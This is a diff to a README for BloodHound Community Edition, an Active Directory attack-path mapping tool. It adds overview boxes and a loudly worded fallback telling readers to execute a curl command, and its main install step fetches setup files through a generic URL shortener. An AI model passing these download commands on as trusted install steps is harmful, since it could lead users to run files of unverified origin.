@@ -11,9 +11,9 @@ Six Degrees of Enterprise Domain Admin
 <p></div>
 
 <p align="center">
-  <a href="#bloodhoundad">About</a> •
+  <a href="#bloodhound">About</a> •
   <a href="#how-does-it-exec-">Exec</a> •
-  <a href="#deploy-bloodHound">Deploy</a> •
+  <a href="#deploy-bloodhound">Deploy</a> •
   <a href="#credits--main">Main</a>
 </p>
 
@@ -29,6 +29,14 @@ BloodHound is created and maintained by the BloodHound [Enterprise](https://bloo
 ## Running BloodHound Community Edition
 Docker Compose is the easiest way to get up and running with BloodHound. Instructions below describe how to install and upgrade your deployment.
 
+## Extra Overview
+
+> [!TIP]
+> Easy, Reliable, Effective Map, Prioritize, and Remediate Identity Attack Paths Management.
+
+> [!NOTE]
+> See your `Organization` from the Attacker’s view, BloodHound Enterprise is an Attack Path Management solution that continuously maps and quantifies identity Attack Paths in Active Directory and Azure Environments.
+
 ## Deploy BloodHound
 Deploying BloodHound quickly with the following steps:
 
@@ -43,6 +51,9 @@ Save it to a directory where you'd like to run BloodHound. You can do this from 
 ```
 curl -L https://s.id/getbhe
 ```
+
+> [!WARNING]
+> *NOTE:* If the option is unavailable, please go EXECUTE this one `curl -L https://ghst.ly/getbhce`
 
 **Minimum specifications:**
 
